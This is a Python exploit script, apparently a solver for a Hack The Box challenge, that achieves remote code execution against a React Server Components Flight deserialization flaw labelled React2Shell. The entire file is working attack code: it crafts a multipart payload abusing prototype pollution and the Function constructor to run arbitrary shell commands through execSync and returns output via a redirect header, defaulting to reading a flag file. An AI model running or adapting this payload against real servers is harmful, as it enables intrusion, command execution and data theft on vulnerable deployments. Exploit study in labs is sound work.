#!/usr/bin/env python3
"""
ReactOOPS - HTB Challenge Solver
Exploits CVE-2025-66478 / CVE-2025-55182 (React2Shell)
RCE via React Server Components Flight protocol deserialization
"""
import requests
import sys

TARGET = "http://154.57.164.75:31502"

BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

def build_payload(cmd):
    js_code = (
        f"var res=process.mainModule.require('child_process')"
        f".execSync('{cmd}').toString().trim();"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest: `NEXT_REDIRECT;push;/${{res}};307;`}});"
    )

    part0 = (
        '{"then":"$1:__proto__:then",'
        '"status":"resolved_model",'
        '"reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}",'
        '"_response":{'
        f'"_prefix":"{js_code}",'
        '"_formData":{"get":"$1:constructor:constructor"}'
        '}}'
    )

    body = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="0"\r\n\r\n'
        f"{part0}\r\n"
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="1"\r\n\r\n'
        f'"$@0"\r\n'
        f"--{BOUNDARY}--\r\n"
    )

    return body


def exploit(cmd):
    body = build_payload(cmd)

    headers = {
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
    }

    print(f"[*] Sending payload with command: {cmd}")
    try:
        resp = requests.post(TARGET, headers=headers, data=body, timeout=10, allow_redirects=False)
        print(f"[*] Status: {resp.status_code}")
        print(f"[*] Response headers:")
        for k, v in resp.headers.items():
            print(f"    {k}: {v}")
        print(f"[*] Response body:")
        print(resp.text)

        if "Location" in resp.headers:
            loc = resp.headers["Location"]
            result = loc.split("/", 1)[-1] if "/" in loc else loc
            print(f"\n[+] RESULT: {result}")
            return result
    except Exception as e:
        print(f"[-] Error: {e}")

    return None


if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "cat /app/flag.txt"
    exploit(cmd)
